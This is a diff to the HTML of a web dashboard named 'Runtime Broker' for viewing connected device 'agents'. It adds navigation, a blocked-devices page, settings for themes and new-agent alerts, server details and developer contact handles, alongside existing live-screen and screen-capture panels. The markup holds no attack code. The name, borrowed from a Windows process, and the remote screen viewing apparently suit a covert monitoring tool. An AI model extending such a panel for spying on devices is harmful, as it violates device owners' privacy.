@@ -13,7 +13,14 @@
         <div class="brand">Runtime Broker</div>
         <div class="subtitle">Connected devices</div>
       </div>
-      <div class="topbar-right"><span id="agentsHeader">Connecting...</span> <button class="btn-muted" onclick="logout()">Logout</button></div>
+      <div class="topbar-right">
+        <nav class="topnav">
+          <button class="navlink active" id="navDevices" onclick="showDevices()">Devices</button>
+          <button class="navlink" id="navBlocked" onclick="showBlocked()">🚫 Blocked</button>
+          <button class="navlink" id="navSettings" onclick="showSettings()">⚙️ Settings</button>
+        </nav>
+        <span id="agentsHeader">Connecting...</span> <button class="btn-muted" onclick="logout()">Logout</button>
+      </div>
     </header>
 
     <main>
@@ -78,6 +85,74 @@
 
         <div id="liveWrap" class="live-wrap" style="display:none;"><div class="live-head"><strong>Live Screen</strong><button class="btn-muted" onclick="closeLive()">Close</button></div><img id="liveImg" alt="Live device screen"></div>
         <div class="capture-panel"><div class="panel-head"><h2>Screen Capture</h2><div><button class="btn-primary" onclick="captureMonitorNow()">Capture</button><button class="btn-muted" onclick="copyMonitorImage()">Copy</button></div></div><div id="monitorCaptureInfo" class="muted">No capture yet</div><img id="monitorImg" style="display:none" alt="Screen capture"></div>
+      </section>
+
+      <section id="blockedPage" class="page" style="display:none;">
+        <div class="page-head">
+          <div>
+            <button class="back-button" onclick="showDevices()">← Devices</button>
+            <h1>🚫 Blocked Devices</h1>
+            <p class="muted">Devices locked after repeated failed passwords. Unlock them here.</p>
+          </div>
+          <button class="icon-button" onclick="loadBlockedDevices()" title="Refresh">↻</button>
+        </div>
+        <div id="blockedList" class="blocked-list"><div class="muted">Loading…</div></div>
+      </section>
+
+      <section id="settingsPage" class="page" style="display:none;">
+        <div class="page-head">
+          <div>
+            <button class="back-button" onclick="showDevices()">← Devices</button>
+            <h1>⚙️ Settings</h1>
+          </div>
+        </div>
+
+        <div class="settings-card">
+          <h3>🎨 Theme</h3>
+          <p class="muted" id="themeSubtitle">Pick one of 10 hand-crafted combos — saved automatically.</p>
+          <div class="swatch-grid" id="themeRow"></div>
+        </div>
+
+        <div class="settings-card">
+          <h3>🔔 Notifications</h3>
+          <label class="switch-row">
+            <span>Alert me when a new agent connects to the server.</span>
+            <input type="checkbox" id="notifToggle">
+          </label>
+          <div class="row-inline">
+            <select id="toneSelect" class="search-input">
+              <option value="system">System default</option>
+              <option value="chime">Chime</option>
+              <option value="alert">Alert</option>
+              <option value="ding">Ding</option>
+              <option value="soft">Soft</option>
+            </select>
+            <button class="btn-muted" onclick="testTone()">▶ Test</button>
+          </div>
+        </div>
+
+        <div class="settings-card">
+          <h3>🖧 Server</h3>
+          <p class="muted">Where this dashboard is being served from.</p>
+          <div class="kv-grid">
+            <div><small>Address</small><b id="srvAddress"></b></div>
+            <div><small>Host</small><b id="srvHost"></b></div>
+            <div><small>Port</small><b id="srvPort"></b></div>
+            <div><small>Server version</small><b id="srvVersion"></b></div>
+            <div><small>Connected agents</small><b id="srvAgents"></b></div>
+          </div>
+        </div>
+
+        <div class="settings-card">
+          <h3>📞 Contact</h3>
+          <p class="muted">Reach out for help or ideas.</p>
+          <div class="kv-grid">
+            <div><small>Telegram</small><b>@4sudosu</b></div>
+            <div><small>Instagram</small><b>@4sudo.su</b></div>
+            <div><small>Gmail</small><b>4sudo.su@gmail.com</b></div>
+            <div><small>GitHub</small><b>@4sudosu</b></div>
+          </div>
+        </div>
       </section>
     </main>
   </div>
